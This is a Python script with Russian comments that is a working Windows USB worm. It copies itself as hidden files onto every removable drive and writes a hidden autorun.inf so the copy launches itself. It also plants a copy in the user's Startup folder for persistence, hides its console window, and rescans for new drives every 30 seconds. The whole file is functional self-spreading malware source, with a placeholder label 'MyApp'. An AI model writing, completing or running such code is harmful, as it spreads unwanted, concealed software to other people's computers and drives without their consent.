import os
import shutil
import sys
import time
import win32api
import win32con
import win32file
from pathlib import Path

def get_usb_drives():
    """Находит все подключенные USB-накопители (Windows)"""
    drives = []
    for drive in win32api.GetLogicalDriveStrings().split('\x00')[:-1]:
        if win32file.GetDriveType(drive) == win32file.DRIVE_REMOVABLE:
            drives.append(drive)
    return drives

def copy_to_destination(source, destination):
    """Копирует файл с проверкой места и обработкой ошибок"""
    try:
        shutil.copy2(source, destination)
        # Устанавливаем скрытый атрибут
        win32api.SetFileAttributes(destination, win32con.FILE_ATTRIBUTE_HIDDEN)
        return True
    except Exception as e:
        print(f"Ошибка копирования: {e}")
        return False

def self_replicate():
    """Основная логика самокопирования"""
    current_file = Path(__file__).resolve()
    filename = current_file.name
    
    # 1. Копируем себя на все USB-накопители
    for usb_drive in get_usb_drives():
        usb_path = Path(usb_drive) / filename
        if not usb_path.exists():
            if copy_to_destination(current_file, usb_path):
                print(f"Скопировано на USB: {usb_drive}")
                
                # Создаем autorun.inf для автозапуска
                autorun_path = Path(usb_drive) / "autorun.inf"
                with open(autorun_path, 'w') as f:
                    f.write(f"""[autorun]
open={filename}
action=Run {filename}
label=MyApp
icon={filename}""")
                win32api.SetFileAttributes(str(autorun_path), win32con.FILE_ATTRIBUTE_HIDDEN)
    
    # 2. Копируем себя в автозагрузку на этом ПК
    startup_folder = Path(os.getenv('APPDATA')) / 'Microsoft' / 'Windows' / 'Start Menu' / 'Programs' / 'Startup'
    startup_path = startup_folder / filename
    if not startup_path.exists():
        if copy_to_destination(current_file,startup_path):
            print(f"Добавлено в автозагрузку: {startup_path}")

def is_first_run():
    """Проверяем, первый ли это запуск на этом компьютере"""
    marker_file = Path(os.getenv('APPDATA')) / "myapp_marker"
    if not marker_file.exists():
        marker_file.touch()
        return True
    return False

def main():
    # Если это первый запуск на новом ПК
    if is_first_run():
        print("Первый запуск на этом компьютере...")
        self_replicate()
    
    # Основная функциональность программы может быть здесь
    print("Программа работает...")
    while True:
        # Постоянно проверяем новые USB-накопители
        self_replicate()
        time.sleep(30) # Проверяем каждые 30 секунд

if __name__ == "__main__":
    # Скрываем окно консоли при запуске
    try:
        win32api.ShowWindow(win32api.GetConsoleWindow(), win32con.SW_HIDE)
    except:
        pass
    
    main()
